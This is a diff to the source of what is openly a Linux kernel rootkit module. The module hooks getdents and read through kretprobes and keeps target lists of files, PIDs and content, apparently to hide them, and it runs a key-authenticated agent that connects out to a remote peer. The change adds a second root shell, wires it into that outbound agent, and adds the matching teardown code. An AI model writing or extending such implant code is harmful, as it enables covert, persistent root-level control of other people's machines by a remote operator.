@@ -57,6 +57,7 @@ MODULE_PARM_DESC(control_key, "hex-encoded 256-bit control key");
 
 static struct rk_agent agent;
 static struct rk_root_shell shell;
+static struct rk_root_shell exec_shell;
 struct rk_target_list file_targets;
 struct rk_target_list pid_targets;
 struct rk_target_list content_targets;
@@ -581,11 +582,15 @@ static int __init rk_init(void)
 	if (error)
 		goto zeroize_key;
 
-	error = rk_agent_start(&agent, peer_address, peer_port,
-			       retry_base_ms, retry_max_ms,
-			       key, sizeof(key), &shell);
+	error = rk_root_shell_init(&exec_shell, shell_timeout_ms);
 	if (error)
 		goto stop_shell;
+
+	error = rk_agent_start(&agent, peer_address, peer_port,
+			       retry_base_ms, retry_max_ms,
+			       key, sizeof(key), &shell, &exec_shell);
+	if (error)
+		goto stop_exec_shell;
 
 	error = register_kretprobe(&getdents_probe);
 	if (error)
@@ -639,6 +644,8 @@ unregister_getdents:
 	unregister_kretprobe(&getdents_probe);
 stop_agent:
 	rk_agent_stop(&agent);
+stop_exec_shell:
+	rk_root_shell_stop(&exec_shell);
 stop_shell:
 	rk_root_shell_stop(&shell);
 zeroize_key:
@@ -657,6 +664,7 @@ static void __exit rk_exit(void)
 	unregister_kretprobe(&read_probe);
 	unregister_kretprobe(&getdents_probe);
 	rk_agent_stop(&agent);
+	rk_root_shell_stop(&exec_shell);
 	rk_root_shell_stop(&shell);
 }
 
